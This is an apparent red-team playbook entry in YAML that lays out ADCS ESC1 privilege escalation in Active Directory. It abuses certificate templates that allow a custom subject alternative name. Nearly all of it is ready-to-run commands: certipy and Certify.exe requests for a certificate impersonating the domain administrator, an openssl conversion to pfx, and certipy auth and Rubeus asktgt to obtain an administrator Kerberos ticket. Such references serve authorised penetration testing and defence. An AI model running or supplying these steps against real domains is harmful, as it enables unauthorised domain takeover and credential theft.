title: ADCS Vunerable Templates Exploitation - ESC1
category: 
  - AD:
    - ADCS  
tactic: Privilege Escalation
tags: []
description:
  - title: Overview
    content: Exploit templates with allowed custom SAN (ESC1)

steps:
  - description: Request a certificate with a custom SAN with a domain admin account
    options:
      - tool: certipy
        usage: certipy req -username user@domain.com -password 'P@ssw0rd' -ca <company-DC-CA> -target <adcs.domain.com> -template <Vuln_Template_Name> -upn administrator@domain.com -dns dc1.domain.com
        comments:
      
      - tool: certify
        usage: | 
          Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb
          openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
        comments:
  
  - description: Use the certificate
    options:
      - tool: certipy
        usage: certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
        comments:
      
      - tool: Rubeus
        usage: Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:pass123 /nowrap
        comments:


comments:
  